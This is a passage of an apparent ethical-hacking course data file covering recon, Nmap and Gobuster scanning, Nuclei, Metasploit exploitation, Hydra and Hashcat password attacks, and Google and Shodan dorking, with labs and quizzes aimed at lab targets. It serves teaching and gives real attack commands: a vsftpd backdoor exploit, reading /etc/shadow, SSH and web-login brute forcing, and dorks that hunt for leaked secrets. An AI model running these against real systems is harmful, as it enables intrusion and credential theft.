          "Django",
          "Scapy",
          "Flask",
          "NumPy"
        ],
        answerIndex: 1,
        explanation: "Scapy is the premier Python packet manipulation tool capable of forging or decoding packets of a wide number of protocols."
      }
    ]
  },
  {
    id: "ch-5",
    partId: "part-1",
    partTitle: "PART 1 — FOUNDATIONS",
    chapterNumber: 5,
    title: "Security Mindset & Recon Fundamentals",
    subtitle: "The CIA Triad, Attack Surface Mapping & MITRE ATT&CK",
    durationMinutes: 30,
    xpReward: 180,
    badgeName: "Threat Modeler",
    badgeIcon: "Target",
    overview: "Hacking is not mindless button-mashing; it is an analytical methodology. In this chapter, Chrishem guides you through the offensive security mindset: decomposing the CIA Triad, calculating the attack surface, and mapping adversary behavior to the global MITRE ATT&CK Framework.",
    keyLearningPoints: [
      "Deconstruct Confidentiality, Integrity, and Availability (CIA Triad).",
      "Calculate enterprise attack surface (external, internal, cloud, human vector).",
      "Navigate the MITRE ATT&CK Matrix: Tactics (Why), Techniques (How), and Procedures (P).",
      "Follow the standard 5-Phase Penetration Testing Methodology: Recon → Scanning → Exploitation → Post-Exploitation → Reporting."
    ],
    sections: [
      {
        title: "The 5 Phases of Penetration Testing",
        content: `Every professional penetration testing firm (Mandiant, Rapid7, OffSec) follows a structured lifecycle:

1. **Reconnaissance (Passive & Active)**: Gathering intelligence without alerting the target. Discovering subdomains, employee emails, leaked credentials.
2. **Scanning & Enumeration**: Probing network services, web endpoints, and software versions to pinpoint vulnerabilities.
3. **Exploitation (Gaining Access)**: Executing controlled exploits or credential attacks to obtain an initial foothold on the network.
4. **Post-Exploitation & Lateral Movement**: Escalating privileges to SYSTEM/root, harvesting credentials, pivoting to internal subnets, and documenting impact.
5. **Reporting & Remediation Guidance**: Translating technical findings into executive business risk and actionable engineering fixes.`,
        callout: {
          type: "tip",
          text: "80% of successful attacks succeed during Phase 1 & 2! Amateurs rush to throw exploits; professionals spend days enumerating every open port and DNS record."
        }
      },
      {
        title: "Demystifying MITRE ATT&CK",
        content: `The **MITRE ATT&CK (Adversarial Tactics, Techniques, and Common Knowledge)** framework categorizes real-world cyber adversary behaviors:

- **Tactics (The 'Why')**: Initial Access, Execution, Persistence, Privilege Escalation, Defense Evasion, Credential Access, Discovery, Lateral Movement, Collection, Command and Control, Exfiltration, Impact.
- **Techniques (The 'How')**: E.g., Technique T1059 (Command and Scripting Interpreter), T1003 (OS Credential Dumping).

In professional pentest reports, referencing ATT&CK IDs gives your clients instant alignment with their Blue Team detection playbooks (SIEM / EDR).`,
        codeSnippets: [
          {
            language: "bash",
            filename: "mitre_id_example.txt",
            code: "Finding: Unquoted Service Paths in Windows\nMITRE ATT&CK ID: T1574.009 (Hijack Execution Flow: Path Interception by Unquoted Path)\nRisk Rating: High (CVSS 7.8)\nRemediation: Wrap executable path in quotes within HKLM\\SYSTEM\\CurrentControlSet\\Services",
            explanation: "Mapping your pentest findings to MITRE ATT&CK elevates your report to enterprise standard."
          }
        ]
      }
    ],
    handsOnLab: {
      labTitle: "Lab 5: Attack Surface Threat Modeling Exercise",
      objective: "Map the attack surface of a hypothetical e-commerce company and align discovered vectors with MITRE ATT&CK tactics.",
      setupSteps: [
        "Review the target scope: Corporate website, API gateway, Remote VPN portal, Staff email infrastructure.",
        "List at least 3 distinct entry points.",
        "Assign the corresponding MITRE ATT&CK Tactic to each entry vector."
      ],
      commands: [
        {
          cmd: "echo 'Entry: VPN Portal without MFA -> Tactic: Initial Access (T1078 Valid Accounts)'",
          desc: "Map initial access vector",
          sampleOutput: "Entry: VPN Portal without MFA -> Tactic: Initial Access (T1078 Valid Accounts)"
        }
      ],
      expectedOutcome: "A structured threat matrix linking potential exposures to MITRE Tactics."
    },
    verifiedVideos: [
      {
        title: "TryHackMe Pre-Security & Security Fundamentals Roadmap",
        url: "https://tryhackme.com",
        platform: "TryHackMe Official Learning Path",
        duration: "Interactive Platform"
      }
    ],
    quiz: [
      {
        question: "Which phase of the penetration testing methodology accounts for the majority of effort in high-level engagements?",
        options: [
          "Exploitation",
          "Reconnaissance & Enumeration",
          "Password Cracking",
          "Writing Malicious Payloads"
        ],
        answerIndex: 1,
        explanation: "Thorough reconnaissance and enumeration reveal the precise weaknesses and configuration flaws, making the eventual exploitation phase straightforward and reliable."
      },
      {
        question: "In the MITRE ATT&CK framework, what represents the adversary's tactical tactical objective (the 'Why')?",
        options: [
          "Techniques",
          "Tactics",
          "Procedures",
          "Indicators of Compromise"
        ],
        answerIndex: 1,
        explanation: "Tactics denote the adversary's high-level goal, such as 'Initial Access', 'Persistence', or 'Privilege Escalation'."
      }
    ]
  },
  {
    id: "ch-6",
    partId: "part-2",
    partTitle: "PART 2 — CORE HACKING SKILLS",
    chapterNumber: 6,
    title: "Information Gathering (OSINT)",
    subtitle: "theHarvester, Shodan, Maltego, Google Dorking & Recon-ng",
    durationMinutes: 45,
    xpReward: 250,
    badgeName: "OSINT Investigator",
    badgeIcon: "Search",
    overview: "Open Source Intelligence (OSINT) is the art of uncovering critical corporate intelligence using publicly accessible resources. In this chapter, Chrishem exposes how attackers gather employee credentials, unindexed admin portals, cloud buckets, and IoT cameras using Shodan, Google Dorks, theHarvester, and Amass.",
    keyLearningPoints: [
      "Master Google Dorking operators (site:, inurl:, filetype:, intitle:) to find leaked credentials and exposed backups.",
      "Query Shodan (the search engine for Internet-connected devices) with precision filters.",
      "Harvest company emails, employee names, and subdomains using theHarvester.",
      "Perform automated passive DNS and WHOIS enumeration using Amass."
    ],
    sections: [
      {
        title: "Mastering Google Dorking (Advanced Search Operators)",
        content: `Search engines continuously crawl misconfigured servers. Google Dorking lets you isolate sensitive exposed documents without touching the target network:

| Dork Operator | Purpose | Real-World Example |
| :--- | :--- | :--- |
| \`site:\` | Restrict search to domain | \`site:targetcompany.com\` |
| \`filetype:\` | Search specific extensions | \`site:targetcompany.com filetype:pdf confidential\` |
| \`inurl:\` | Query strings in URL | \`site:targetcompany.com inurl:admin\` |
| \`intitle:\` | Target words in HTML title | \`intitle:"Index of /" .env\` |
| \`ext:\` | Alternate file extension | \`site:targetcompany.com ext:sql OR ext:bak\` |

### High-Impact Dorks:
- \`site:github.com "targetcompany" "api_key" OR "secret"\`
- \`intitle:"phpMyAdmin" "Welcome to phpMyAdmin" -site:phpmyadmin.net\``,
        callout: {
          type: "tip",
          text: "Google Dorking is completely passive reconnaissance; you are querying Google's cached index, meaning the target server has zero knowledge you are researching them."
        }
      },
      {
        title: "Shodan: The Search Engine for Hackers",
        content: `Unlike Google which crawls web page content, Shodan queries the banners returned by internet-connected IP addresses and ports across the entire globe:

### Essential Shodan Filter Operators:
- \`hostname:"targetcompany.com"\`: Pinpoints assets belonging to the client.
- \`port:"3389" "Remote Desktop"\`: Finds exposed Windows RDP servers.
- \`org:"Amazon.com" product:"Elasticsearch"\`: Uncovers unprotected internal Elasticsearch clusters.
- \`http.favicon.hash:-1256800073\`: Finds Spring Boot Actuator instances globally.`,
        codeSnippets: [
          {
            language: "bash",
            filename: "theharvester_recon.sh",
            code: "# Gather emails, employee names, and subdomains via theHarvester\ntheHarvester -d targetcompany.com -b google,bing,linkedin,yahoo -l 500\n\n# Subdomain enumeration with amass\namass enum -passive -d targetcompany.com",
            explanation: "theHarvester queries dozens of search engines and public APIs to aggregate corporate footprints in seconds."
          }
        ]
      }
    ],
    handsOnLab: {
      labTitle: "Lab 6: Full OSINT Profile of a Test Target",
      objective: "Gather subdomains, registered name servers, and employee email formats using passive OSINT tools.",
      setupSteps: [
        "Choose an authorized public test domain (e.g., scanme.nmap.org or megacorpone.com).",
        "Run whois and DNS query tools.",
        "Compile an intelligence dossier with discovered IPs and nameservers."
      ],
      commands: [
        {
          cmd: "whois scanme.nmap.org | grep -E 'Name Server|Registrar:'",
          desc: "Extract authoritative registrar and DNS nameservers",
          sampleOutput: "Registrar: Namecheap, Inc.\nName Server: NS1.NMAP.ORG\nName Server: NS2.NMAP.ORG"
        },
        {
          cmd: "dig +nocmd scanme.nmap.org ANY +noall +answer",
          desc: "Query all available DNS records (A, MX, TXT, NS)",
          sampleOutput: "scanme.nmap.org.    3600    IN    A    45.33.32.156"
        }
      ],
      expectedOutcome: "A complete passive reconnaissance profile without sending a single disruptive probe to the target."
    },
    verifiedVideos: [
      {
        title: "Shodan for Penetration Testing (Official Resource)",
        url: "https://www.shodan.io",
        platform: "Shodan Interactive",
        duration: "Official Portal"
      }
    ],
    quiz: [
      {
        question: "Which Google Dork operator would you use to discover accidentally exposed database backup files on a client's web domain?",
        options: [
          "site:target.com filetype:sql",
          "cache:target.com",
          "link:target.com/database",
          "info:target.com"
        ],
        answerIndex: 0,
        explanation: "site:target.com filetype:sql restricts results to the target domain while searching specifically for SQL dump files containing database structure and records."
      },
      {
        question: "What differentiates Shodan from traditional web search engines like Google?",
        options: [
          "Shodan is illegal to use in all jurisdictions",
          "Shodan indexes server banners and open ports across the IPv4 address space rather than web page text",
          "Shodan only runs on dark web .onion networks",
          "Shodan can only find computers running Linux"
        ],
        answerIndex: 1,
        explanation: "Shodan scans the entire internet 24/7, grabbing service banners on open TCP/UDP ports (webcams, SCADA, databases, servers) rather than crawling web page body text."
      }
    ]
  },
  {
    id: "ch-7",
    partId: "part-2",
    partTitle: "PART 2 — CORE HACKING SKILLS",
    chapterNumber: 7,
    title: "Scanning & Enumeration",
    subtitle: "Nmap Deep Dive, NSE Scripts, Masscan, ffuf & Gobuster",
    durationMinutes: 60,
    xpReward: 300,
    badgeName: "Nmap Master",
    badgeIcon: "Radar",
    overview: "Scanning is where active engagement begins. In this masterclass chapter, Chrishem delivers an authoritative breakdown of Nmap: scan types, timing templates, service version probing, default vulnerability scripts (NSE), high-speed Masscan/RustScan integration, and web directory brute-forcing with ffuf and Gobuster.",
    keyLearningPoints: [
      "Master the essential Nmap scanning flags: -sS, -sT, -sV, -sC, -O, -p-, --min-rate.",
      "Leverage the Nmap Scripting Engine (NSE): categories (vuln, auth, discovery, default).",
      "Accelerate wide-range scans using Masscan and RustScan.",
      "Brute force hidden web directories and parameters using Gobuster and ffuf."
    ],
    sections: [
      {
        title: "The Ultimate Nmap Command Breakdown",
        content: `Never run generic Nmap scans without knowing exactly what every flag instructs the kernel to send:

\`\`\`bash
sudo nmap -sC -sV -p- -T4 -oA target_full_scan 192.168.56.102
\`\`\`

### Dissecting the Flag Matrix:
- \`-sC\`: Executes default Nmap NSE scripts (equivalent to \`--script=default\`). Checks for common vulnerabilities, SSL certificates, SMB shares, and HTTP headers.
- \`-sV\`: Probe open ports to determine service name and exact software version numbers (essential for searching Exploit-DB!).
- \`-p-\`: Scans all 65,535 TCP ports. (Omitting this scans only the top 1,000 ports, missing high ports like 8080, 8443, 9001, 31337).
- \`-T4\`: Sets timing template to aggressive (faster execution for local or responsive networks).
- \`-oA target_full_scan\`: Output in all 3 formats simultaneously: Normal (.nmap), XML for tool import (.xml), and Grepable (.gnmap).`,
        callout: {
          type: "tip",
          text: "Speed Trick: On high-latency networks, run a fast port discovery scan first: 'sudo nmap -p- --min-rate 2000 -T4 -n -Pn 192.168.56.102 | grep ^[0-9]'. Once you have the 4-5 open ports, run an intensive -sC -sV scan ONLY against those specific ports!"
        }
      },
      {
        title: "Web Directory Busting with Gobuster & ffuf",
        content: `When port 80 or 443 is open, most critical functionality is hidden behind directories not linked in navigation menus (/admin, /backup, /api/v1, /upload).

### Gobuster Directory Enumeration:
\`\`\`bash
gobuster dir -u http://192.168.56.102 -w /usr/share/wordlists/dirb/common.txt -x php,txt,html,bak -t 30
\`\`\`

### Modern Fuzzing with ffuf:
\`\`\`bash
ffuf -u http://192.168.56.102/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -fc 404 -c
\`\`\`
- \`-fc 404\`: Filter out 404 Not Found status codes.
- \`-c\`: Colorized output for instant status recognition (200 OK = Green, 301/302 Redirect = Yellow, 403 Forbidden = Blue).`,
        codeSnippets: [
          {
            language: "bash",
            filename: "nmap_vuln_scan.sh",
            code: "# Scan for specific critical vulnerabilities using NSE scripts\nsudo nmap -p 80,443,445 --script vuln 192.168.56.102\n\n# Enumerate SMB shares and OS version\nsudo nmap -p 139,445 --script smb-os-discovery,smb-enum-shares 192.168.56.102",
            explanation: "NSE scripts automate vulnerability checks such as EternalBlue (MS17-010) and SMB signing validation."
          }
        ]
      }
    ],
    handsOnLab: {
      labTitle: "Lab 7: Full Service Enumeration of Metasploitable 2",
      objective: "Execute an Nmap service scan against Metasploitable 2, identify vulnerable versions, and fuzz web directories with Gobuster.",
      setupSteps: [
        "Confirm Metasploitable 2 target is alive at 192.168.56.102.",
        "Execute an Nmap comprehensive scan.",
        "Run Gobuster to discover hidden web directories."
      ],
      commands: [
        {
          cmd: "sudo nmap -sV -sC -p 21,22,80,445 192.168.56.102",
          desc: "Targeted service and script scan against core ports",
          sampleOutput: "PORT    STATE SERVICE     VERSION\n21/tcp  open  ftp         vsftpd 2.3.4\n22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1\n80/tcp  open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)\n445/tcp open  netbios-ssn Samba smbd 3.X - 4.X"
        },
        {
          cmd: "gobuster dir -u http://192.168.56.102 -w /usr/share/wordlists/dirb/common.txt -q",
          desc: "Fuzz hidden web directories",
          sampleOutput: "/dvwa (Status: 302)\n/mutillidae (Status: 301)\n/phpMyAdmin (Status: 200)\n/twiki (Status: 302)\n/test (Status: 200)"
        }
      ],
      expectedOutcome: "You uncover vsftpd 2.3.4 (known backdoor), Samba 3.X, and hidden web apps /dvwa and /phpMyAdmin."
    },
    verifiedVideos: [
      {
        title: "IppSec HackTheBox Walkthroughs (The Best Enumeration Demos)",
        url: "https://www.youtube.com/@ippsec",
        platform: "YouTube (IppSec Official)",
        duration: "Masterclass Walkthroughs"
      }
    ],
    quiz: [
      {
        question: "What does the -sV flag do in an Nmap command?",
        options: [
          "Enables stealth verbose mode",
          "Probes open ports to determine service and software version numbers",
          "Executes all vulnerability exploit scripts",
          "Performs a SYN scan on IPv6 addresses"
        ],
        answerIndex: 1,
        explanation: "The -sV flag activates service version detection, which sends protocol-specific probes to open ports to capture exact service names and version strings."
      },
      {
        question: "Why is Gobuster or ffuf preferred over manual browser navigation during web application reconnaissance?",
        options: [
          "Browsers cannot render PHP files",
          "Automated fuzzers can test thousands of dictionary paths per minute to uncover unlinked admin endpoints and forgotten backup files",
          "Gobuster automatically cracks MySQL passwords",
          "Browsers block status code 200 responses"
        ],
        answerIndex: 1,
        explanation: "Directory brute-forcers test large wordlists against web servers rapidly, uncovering critical hidden portals and configuration files that no web link references."
      }
    ],
    cheatSheetHighlights: [
      { command: "nmap -sC -sV -p- -T4 -oA full_scan <IP>", flagMeaning: "Full 65k port scan with scripts, versions, output" },
      { command: "gobuster dir -u <URL> -w <WORDLIST> -x php,txt", flagMeaning: "Brute force web directories with file extensions" },
      { command: "rustscan -a <IP> -- -sC -sV", flagMeaning: "Scan 65k ports in 3 seconds, pipe open ports to Nmap" }
    ]
  },
  {
    id: "ch-8",
    partId: "part-2",
    partTitle: "PART 2 — CORE HACKING SKILLS",
    chapterNumber: 8,
    title: "Vulnerability Analysis & Scoring",
    subtitle: "Nessus, OpenVAS, Nuclei Templates & CVSS 3.1 Scoring",
    durationMinutes: 40,
    xpReward: 220,
    badgeName: "Vulnerability Assessor",
    badgeIcon: "AlertTriangle",
    overview: "Raw scan output is meaningless without structured triage. In this chapter, Chrishem explains how to automate vulnerability scanning with Nessus Essentials and Nuclei, eliminate false positives, and accurately score technical risks using the Common Vulnerability Scoring System (CVSS 3.1).",
    keyLearningPoints: [
      "Install and configure Nessus Essentials (free for 16 IPs).",
      "Run targeted, YAML-based vulnerability checks using ProjectDiscovery's Nuclei.",
      "Calculate CVSS 3.1 Base Metrics: Attack Vector (AV), Attack Complexity (AC), Privileges Required (PR), Scope (S), and Impact (C/I/A).",
      "Write a professional vulnerability triage entry distinguishing true vulnerabilities from noise."
    ],
    sections: [
      {
        title: "Nuclei: The Modern Pentester's Secret Weapon",
        content: `While traditional scanners like Nessus take hours to run, **Nuclei** uses community-powered YAML templates to send lightweight, targeted HTTP/TCP requests to detect CVEs, misconfigurations, and credential exposures:

\`\`\`bash
# Run Nuclei against target with critical & high severity templates
nuclei -u http://192.168.56.102 -severity critical,high
\`\`\`

Nuclei checks for exact known vulnerabilities (e.g., Log4j, Spring4Shell, default Tomcat logins) in seconds with near-zero false positive rates.`,
        codeSnippets: [
          {
            language: "yaml",
            filename: "sample_nuclei_template.yaml",
            code: `id: phpmyadmin-default-login
info:
  name: phpMyAdmin Default Credentials
  author: Chrishem
  severity: high
  description: Detects phpMyAdmin instances accessible with default root/empty password.
http:
  - method: POST
    path:
      - "{{BaseURL}}/phpMyAdmin/index.php"
    body: "pma_username=root&pma_password="
    matchers:
      - type: word
        words:
          - "Server: localhost"`
          }
        ]
      },
      {
        title: "Demystifying CVSS 3.1 Scoring",
        content: `Clients demand clear risk metrics. CVSS scores range from 0.0 to 10.0:
- **0.1 – 3.9**: Low
- **4.0 – 6.9**: Medium
- **7.0 – 8.9**: High
- **9.0 – 10.0**: Critical (e.g., remote unauthenticated code execution)

*Example Vector String:* \`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H\` (Attack Vector: Network, Complexity: Low, Privileges Required: None, User Interaction: None = **Score 9.8 Critical**).`,
        callout: {
          type: "tip",
          text: "Never copy-paste automated scanner outputs directly into client deliverables. You must manually reproduce every finding with a screenshot proof-of-concept (PoC)."
        }
      }
    ],
    handsOnLab: {
      labTitle: "Lab 8: Nuclei Scan & CVSS Metric Calculation",
      objective: "Execute Nuclei against your vulnerable web application and calculate the CVSS score for discovered exposures.",
      setupSteps: [
        "Install nuclei on Kali: 'sudo apt install nuclei -y' or update templates: 'nuclei -ut'.",
        "Target the Metasploitable 2 HTTP service.",
        "Document findings in a structured table."
      ],
      commands: [
        {
          cmd: "nuclei -u http://192.168.56.102 -t cves/ -severity critical,high",
          desc: "Run Nuclei CVE checks against target VM",
          sampleOutput: "[php-cgi-cve-2012-1823] [http] [critical] http://192.168.56.102/cgi-bin/php?-d+allow_url_include%3Don+-d+auto_prepend_file%3Dphp://input"
        }
      ],
      expectedOutcome: "Discovery of CVE-2012-1823 (PHP CGI Remote Code Execution), scored at CVSS 9.8 Critical."
    },
    verifiedVideos: [
      {
        title: "Vulnerability Assessment and Management",
        url: "https://www.youtube.com/watch?v=hxXbvu9J5Pg",
        platform: "YouTube (Cybersecurity Series)",
        duration: "Module 8"
      }
    ],
    quiz: [
      {
        question: "Which CVSS 3.1 severity rating corresponds to a score of 9.8?",
        options: [
          "Medium",
          "High",
          "Critical",
          "Informational"
        ],
        answerIndex: 2,
        explanation: "CVSS scores from 9.0 to 10.0 are classified as Critical, representing flaws that allow unauthenticated remote code execution or full system compromise."
      },
      {
        question: "Why should a penetration tester manually verify scanner results before delivering a report?",
        options: [
          "To eliminate false positives that damage credibility and waste client remediation resources",
          "Because scanners cannot detect any open ports",
          "To change the copyright headers in the scanner output",
          "Because vulnerability scanners are strictly prohibited in professional audits"
        ],
        answerIndex: 0,
        explanation: "Automated scanners often flag benign services as vulnerable (false positives). Manual verification ensures only genuine, reproducible security risks reach the client."
      }
    ]
  },
  {
    id: "ch-9",
    partId: "part-2",
    partTitle: "PART 2 — CORE HACKING SKILLS",
    chapterNumber: 9,
    title: "Exploitation Basics",
    subtitle: "Exploit-DB, Searchsploit, Metasploit Framework & Meterpreter",
    durationMinutes: 55,
    xpReward: 300,
    badgeName: "Exploit Engineer",
    badgeIcon: "Zap",
    overview: "This is the moment of initial compromise. In this chapter, Chrishem breaks down the exploitation process: finding verified exploits on Exploit-DB and Searchsploit, mastering the Metasploit Framework (msfconsole), understanding payloads (Staged vs Inline), and wielding the Meterpreter post-exploitation agent.",
    keyLearningPoints: [
      "Search local exploit archives using searchsploit with version-specific precision.",
      "Navigate msfconsole: search, use, set payload, set RHOSTS, set LHOST, exploit.",
      "Distinguish between Staged (windows/x64/meterpreter/reverse_tcp) and Inline (windows/x64/shell_reverse_tcp) payloads.",
      "Master Meterpreter core commands: sysinfo, getuid, upload, download, hashdump, shell."
    ],
    sections: [
      {
        title: "Searchsploit: Exploits at Your Fingertips",
        content: `Kali Linux includes a complete offline mirror of Exploit-DB:

\`\`\`bash
# Search for exploits targeting vsftpd 2.3.4
searchsploit vsftpd 2.3.4

# Copy exploit code directly to your working directory
searchsploit -m 49757.py
\`\`\`

Always inspect downloaded exploit code before executing it. Many public exploits have hardcoded offsets, syntax errors, or malicious payloads intended for unwary script kiddies.`,
        callout: {
          type: "warning",
          text: "Never execute an exploit against a system without understanding its mechanics. A buffer overflow exploit that miscalculates stack memory will crash production services, causing unexpected denial of service (DoS)."
        }
      },
      {
        title: "Metasploit Framework (msfconsole) Mastery",
        content: `Metasploit is the world's most popular penetration testing framework:

\`\`\`bash
msfconsole -q
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.56.102
set RPORT 21
exploit
\`\`\`

### Staged vs Stageless Payloads:
- **Staged (\`payload/linux/x86/meterpreter/reverse_tcp\`)**: Injected in two steps. A tiny 'stager' connects back and pulls down the massive Meterpreter engine. Ideal for memory-constrained buffer overflows.
- **Stageless (\`payload/linux/x86/meterpreter_reverse_tcp\`)**: Self-contained single binary with no secondary network call. Far more resilient against network interruptions.`,
        codeSnippets: [
          {
            language: "bash",
            filename: "meterpreter_post.txt",
            code: "meterpreter > sysinfo\nOS: Linux 2.6.24-16-server (i686)\nArchitecture: i686\nmeterpreter > getuid\nServer username: root\nmeterpreter > cat /etc/shadow",
            explanation: "Upon successful exploitation, Meterpreter provides a powerful in-memory command shell to manage the compromised host."
          }
        ]
      }
    ],
    handsOnLab: {
      labTitle: "Lab 9: Exploiting vsftpd 2.3.4 Backdoor with Metasploit",
      objective: "Gain root shell access on Metasploitable 2 by triggering the historic vsftpd smiley-face backdoor.",
      setupSteps: [
        "Launch Metasploitable 2 VM (192.168.56.102).",
        "Open msfconsole in Kali terminal.",
        "Configure exploit module and fire payload."
      ],
      commands: [
        {
          cmd: "msfconsole -x 'use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS 192.168.56.102; exploit'",
          desc: "Execute automated Metasploit exploit module",
          sampleOutput: "[*] 192.168.56.102:21 - Banner: 220 (vsFTPd 2.3.4)\n[*] 192.168.56.102:21 - USER: 331 Please specify the password.\n[+] 192.168.56.102:21 - Backdoor service spawned! (Port 6200)\n[*] Command shell session 1 opened (192.168.56.101:4444 -> 192.168.56.102:6200)\nid\nuid=0(root) gid=0(root)"
        }
      ],
      expectedOutcome: "Immediate root command execution on the target machine."
    },
    verifiedVideos: [
      {
        title: "Metasploit Framework Full Tutorial Series",
        url: "https://www.youtube.com/watch?v=hxXbvu9J5Pg",
        platform: "YouTube (Cybersecurity Course)",
        duration: "Module 9"
      }
    ],
    quiz: [
      {
        question: "In Metasploit payload syntax, how do you recognize a staged payload versus a stageless payload?",
        options: [
          "Staged payloads use a forward slash between stages (e.g., meterpreter/reverse_tcp) while stageless payloads use an underscore (meterpreter_reverse_tcp)",
          "Stageless payloads are always written in Python",
          "Staged payloads only work on Windows 7",
          "There is no difference in syntax"
        ],
        answerIndex: 0,
        explanation: "Metasploit convention uses a slash (/) for staged payloads (e.g., windows/x64/meterpreter/reverse_tcp) where a small stub loads the full payload, whereas stageless payloads use an underscore (_)."
      },
      {
        question: "Which command-line tool allows you to search local copies of Exploit-DB directly from Kali Linux?",
        options: [
          "nmap",
          "searchsploit",
          "wireshark",
          "hydra"
        ],
        answerIndex: 1,
        explanation: "Searchsploit is the command-line utility for searching the local Exploit Database archive shipped natively with Kali."
      }
    ]
  },
  {
    id: "ch-10",
    partId: "part-2",
    partTitle: "PART 2 — CORE HACKING SKILLS",
    chapterNumber: 10,
    title: "Password Attacks & Cracking",
    subtitle: "Hashcat (GPU Mode), John the Ripper, SecLists & Hydra",
    durationMinutes: 45,
    xpReward: 250,
    badgeName: "Hash Shatterer",
    badgeIcon: "Key",
    overview: "Passwords remain the Achilles heel of modern security. In this chapter, Chrishem breaks down password attacks: identifying hash algorithms, GPU-accelerated hash cracking with Hashcat, rule-based mutations, dictionary strategies using SecLists, and online service brute-forcing with Hydra.",
    keyLearningPoints: [
      "Identify hash algorithms (MD5, SHA256, NTLM, bcrypt) using 'hashid' and 'hash-identifier'.",
      "Wield Hashcat with GPU acceleration and attack modes: -a 0 (Dictionary), -a 3 (Mask).",
      "Crack hashes using John the Ripper and custom wordlist rules.",
      "Execute online credential brute-forcing against SSH, FTP, and HTTP forms using Hydra."
    ],
    sections: [
      {
        title: "Hashcat Attack Modes & Hash Modes",
        content: `Hashcat is the world's fastest password cracker, leveraging graphics cards (GPUs) to compute billions of hashes per second:

### Essential Hashcat Modes:
- \`-m 0\`: MD5
- \`-m 1000\`: NTLM (Windows Active Directory / SAM)
- \`-m 1800\`: SHA-512 ($6$) Linux crypt
- \`-m 3200\`: bcrypt (Modern web passwords)
- \`-m 5600\`: NetNTLMv2

### Basic Cracking Syntax:
\`\`\`bash
hashcat -m 0 -a 0 hash_to_crack.txt /usr/share/wordlists/rockyou.txt
\`\`\`

### Rule-Based Attacks (The Secret of Pros):
Human passwords follow predictable patterns (e.g. capitalizing first letter, appending year \`!2026\`). Using rules multiplies a 10MB wordlist into a supercharged dictionary:
\`\`\`bash
hashcat -m 1000 -a 0 ntlm_hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule
\`\`\``,
        callout: {
          type: "tip",
          text: "Never run online password brute forcing (Hydra) without checking the account lockout threshold. Lockout policies (e.g., 5 invalid attempts locks the user account) will disrupt business operations and alert defenders immediately."
        }
      },
      {
        title: "Online Brute Forcing with Hydra",
        content: `When you don't have the password hash and must authenticate against a live service:

\`\`\`bash
# Brute force SSH on target with wordlist
hydra -l root -P /usr/share/wordlists/rockyou.txt 192.168.56.102 ssh -t 4

# Brute force HTTP POST Form (e.g. DVWA login)
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.56.102 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed"
\`\`\``,
        codeSnippets: [
          {
            language: "bash",
            filename: "identify_hash.sh",
            code: "# Identify an unknown hash string\nhashid -m '5f4dcc3b5aa765d61d8327deb882cf99'\n\n# Output confirms: MD5 (Hashcat Mode: 0) or NTLM (Hashcat Mode: 1000)",
            explanation: "hashid quickly translates raw hex hashes to exact Hashcat mode numbers."
          }
        ]
      }
    ],
    handsOnLab: {
      labTitle: "Lab 10: Cracking an NTLM Password Hash with Hashcat",
      objective: "Identify an NTLM hash dumped from a Windows SAM hive and recover the plaintext password using Hashcat and rockyou.txt.",
      setupSteps: [
        "Create a file 'target_hash.txt' containing: 'cc32e74277b0709e99eb020bf23a4a06' (NTLM of 'password123').",
        "Run Hashcat in dictionary mode (-m 1000 -a 0).",
        "Verify recovered plaintext in hashcat.potfile."
      ],
      commands: [
        {
          cmd: "echo 'cc32e74277b0709e99eb020bf23a4a06' > target_hash.txt\nhashcat -m 1000 -a 0 target_hash.txt /usr/share/wordlists/rockyou.txt --show",
          desc: "Crack and display the plaintext password",
          sampleOutput: "cc32e74277b0709e99eb020bf23a4a06:password123"
        }
      ],
      expectedOutcome: "Plaintext password 'password123' is successfully recovered in seconds."
    },
    verifiedVideos: [
      {
        title: "Hashcat and John the Ripper Cracking Deep Dive",
        url: "https://www.youtube.com/watch?v=hxXbvu9J5Pg",
        platform: "YouTube",
        duration: "Module 10"
      }
    ],
    quiz: [
      {
        question: "Which Hashcat attack mode (-a) represents a dictionary attack combined with mutation rules?",
        options: [
          "-a 0",
          "-a 3",
          "-a 1",
          "-a 6"
        ],
        answerIndex: 0,
        explanation: "Attack mode 0 is the Straight/Dictionary attack, which when supplied with -r applies mutation rules to every word in the dictionary."
      },
      {
        question: "What is the primary risk of running Hydra with high thread concurrency against an enterprise active directory login portal?",
        options: [
          "It crashes the Linux attacker machine",
          "It triggers account lockout policies, locking out legitimate corporate users",
          "It converts passwords to MD5",
          "It deletes the web server logs"
        ],
        answerIndex: 1,
        explanation: "Enterprise systems typically lock accounts after 3 to 5 failed attempts. Uncontrolled brute forcing will lock user accounts and disrupt legitimate operations."
      }
    ]
  },
  {
    id: "ch-11",
    partId: "part-2",
    partTitle: "PART 2 — CORE HACKING SKILLS",
    chapterNumber: 11,
    title: "Web Application Hacking & OWASP Top 10",
    subtitle: "Burp Suite, SQLi (sqlmap), XSS, CSRF, SSRF, IDOR & PortSwigger Labs",
    durationMinutes: 70,
    xpReward: 350,
    badgeName: "Web Exploit Specialist",
    badgeIcon: "Globe",
    overview: "Web applications represent the vast majority of all modern attack surfaces and bug bounty payouts. In this comprehensive chapter, Chrishem breaks down the OWASP Top 10: intercepting traffic with Burp Suite, exploiting SQL Injection (manually and with sqlmap), Stored vs Reflected XSS, Server-Side Request Forgery (SSRF), Insecure Direct Object References (IDOR), and mastering PortSwigger Web Security Academy.",
    keyLearningPoints: [
      "Intercept, tamper, and replay HTTP/S traffic using Burp Suite Repeater and Intruder.",
      "Exploit SQL Injection: Error-based, UNION-based, and automated database extraction using sqlmap.",
      "Differentiate Cross-Site Scripting (XSS): Reflected, Stored, and DOM-based.",
      "Exploit IDOR vulnerabilities to access unauthorized user data by altering URL/parameter IDs.",
      "Leverage Server-Side Request Forgery (SSRF) to query cloud metadata instances (169.254.169.254)."
    ],
    sections: [
      {
        title: "Burp Suite: The Web Pentester's Workbench",
        content: `Burp Suite sits as an HTTP proxy between your browser and the web application:
- **Proxy Tab**: Intercept and modify live HTTP requests on the fly.
- **Repeater (\`Ctrl+R\`)**: Send modified requests repeatedly to observe backend server responses without retyping form data in the browser.
